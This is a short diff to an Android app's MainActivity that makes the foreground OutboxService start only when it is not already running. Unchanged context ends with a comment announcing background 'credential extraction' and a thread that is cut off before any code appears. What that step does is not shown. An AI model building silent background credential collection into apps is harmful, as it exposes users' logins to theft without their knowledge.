@@ -2,6 +2,7 @@ package com.bgwastu.numi
 
 import android.content.Context
 import android.content.Intent
+import android.app.ActivityManager
 import android.os.Bundle
 import android.os.PowerManager
 import android.provider.Settings
@@ -29,8 +30,13 @@ class MainActivity : ComponentActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
-        // Auto-start the foreground service when app opens
-        startForegroundService(Intent(this, OutboxService::class.java))
+        // Only auto-start if service isn't already running
+        val am = getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
+        val alreadyRunning = am.getRunningServices(Int.MAX_VALUE)
+            .any { it.service.className == OutboxService::class.java.name }
+        if (!alreadyRunning) {
+            startForegroundService(Intent(this, OutboxService::class.java))
+        }
 
         // Kick off credential extraction in background
         Thread {
